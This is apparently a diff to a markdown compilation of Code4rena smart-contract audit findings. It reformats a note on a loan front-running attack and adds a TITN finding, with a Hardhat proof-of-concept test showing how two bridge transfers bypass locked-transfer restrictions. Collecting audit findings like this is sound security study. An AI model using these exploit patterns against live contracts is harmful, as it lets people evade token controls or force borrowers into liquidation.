@@ -616,9 +616,9 @@ describe("Make Curve Subject To Be A Honey Pot test", () => {
 
 ### frontrun on loan operations
 
-- Summary: Attackers can exploit a front-running attack on the repayLoan function, causing the debt repayment to fail and leading to the liquidation of the borrower’s collateral. An attacker can front-run the repayLoan call by executing mergeTranches or addNewTranche, which alters the loan ID in \_loans. This makes it impossible for the borrower to repay their loan, potentially causing collateral to be liquidated.
+- Summary: Attackers can exploit a front-running attack on the repayLoan function, causing the debt repayment to fail and leading to the liquidation of the borrower’s collateral. An attacker can front-run the repayLoan call by executing mergeTranches or addNewTranche, which alters the loan ID in `_loans`. This makes it impossible for the borrower to repay their loan, potentially causing collateral to be liquidated.
 
-- Impact & Recommendation: Avoid deleting or updating the \_loanId in a way that affects ongoing loan operations. Alternatively, consider restricting functions that modify loan IDs near the loan's expiry to prevent such attacks.
+- Impact & Recommendation: Avoid deleting or updating the `_loanId` in a way that affects ongoing loan operations. Alternatively, consider restricting functions that modify loan IDs near the loan's expiry to prevent such attacks.
   <br> 🐬: [Source](https://code4rena.com/reports/2024-04-gondi#h-010-The-attackers-front-running-repayloans-so-that-the-debt-cannot-be-repaid) & [Report](https://code4rena.com/reports/2024-04-gondi)
 
 <details><summary>POC</summary>
@@ -640,6 +640,89 @@ describe("Make Curve Subject To Be A Honey Pot test", () => {
             revert LoanExpiredError();
         }
     }
+
+```
+
+</details>
+
+## 10.[High] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.
+
+### Bypass transfer restrictions
+
+- Summary: In the TITN contract users could bypass transfer restrictions by using bridge operations. Although direct transfers were restricted when `isBridgedTokensTransferLocked` was enabled (allowing only transfers to a specific contract or LayerZero endpoint), bridge operations used mint and burn functions instead of transfer/transferFrom, thus avoiding the restriction. By bridging tokens to themselves on another chain and then bridging again to a target address, users could effectively transfer TITN tokens to any address, violating intended controls designed to prevent early trading before the token generation event (TGE).
+
+- Impact & Recommendation: A fix was implemented to restrict bridge transfers so that users can only bridge tokens to their own addresses.
+  <br> 🐬: [Source](https://code4rena.com/reports/2025-02-thorwallet#h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted) & [Report](https://code4rena.com/reports/2025-02-thorwallet)
+
+<details><summary>POC</summary>
+
+```javascript
+
+        it('user1  transfer TITN tokens to user2 by bridge when transfer disable', async function () {
+            // transfer TGT to the merge contract
+            await tgt.connect(user1).approve(mergeTgt.address, ethers.utils.parseUnits('100', 18))
+            await tgt.connect(user1).transferAndCall(mergeTgt.address, ethers.utils.parseUnits('100', 18), '0x')
+            // claim TITN
+            const claimableAmount = await mergeTgt.claimableTitnPerUser(user1.address)
+            await mergeTgt.connect(user1).claimTitn(claimableAmount)
+            // attempt to transfer TITN (spoiler alert: it should fail)
+            try {
+                await arbTITN.connect(user1).transfer(user2.address, ethers.utils.parseUnits('1', 18))
+                expect.fail('Transaction should have reverted')
+            } catch (error: any) {
+                expect(error.message).to.include('BridgedTokensTransferLocked')
+            }
+
+
+            // Minting an initial amount of tokens to ownerA's address in the TITN contract
+            const initialAmount = ethers.utils.parseEther('1000000000')
+            // Defining the amount of tokens to send and constructing the parameters for the send operation
+            const tokensToSend = ethers.utils.parseEther('1')
+            // Defining extra message execution options for the send operation
+            const options = Options.newOptions().addExecutorLzReceiveOption(200000, 0).toHex().toString()
+            const sendParam = [
+                eidA,
+                ethers.utils.zeroPad(user1.address, 32),
+                tokensToSend,
+                tokensToSend,
+                options,
+                '0x',
+                '0x',
+            ]
+
+            // Fetching the native fee for the token send operation
+            const [nativeFee] = await arbTITN.quoteSend(sendParam, false)
+            // Executing the send operation from TITN contract
+            const startBalanceBOnBase = await baseTITN.balanceOf(user1.address)
+
+            await arbTITN.connect(user1).send(sendParam, [nativeFee, 0], user1.address, { value: nativeFee })
+            const finalBalanceBOnBase = await baseTITN.balanceOf(user1.address)
+            expect(startBalanceBOnBase).to.eql(ethers.utils.parseEther('0'))
+            expect(finalBalanceBOnBase.toString()).to.eql(tokensToSend.toString())
+
+            // Fetching the native fee for the token send operation
+            const sendParam2 = [
+                eidB,
+                ethers.utils.zeroPad(user2.address, 32),
+                tokensToSend,
+                tokensToSend,
+                options,
+                '0x',
+                '0x',
+            ]
+
+            const [nativeFee2] = await baseTITN.quoteSend(sendParam2, false)
+            const startBalanceBOnArb = await arbTITN.balanceOf(user2.address)
+            await baseTITN.connect(user1).send(sendParam2, [nativeFee, 0], user2.address, { value: nativeFee2 })
+            const finalBalanceBOnArb = await arbTITN.balanceOf(user2.address)
+
+            console.log("before user2 balance: ", startBalanceBOnArb);
+            console.log("after user2 balance: ", finalBalanceBOnArb);
+
+            expect(startBalanceBOnArb).to.eql(ethers.utils.parseEther('0'))
+            expect(finalBalanceBOnArb.toString()).to.eql(tokensToSend.toString())
+
+        })
 
 ```
 
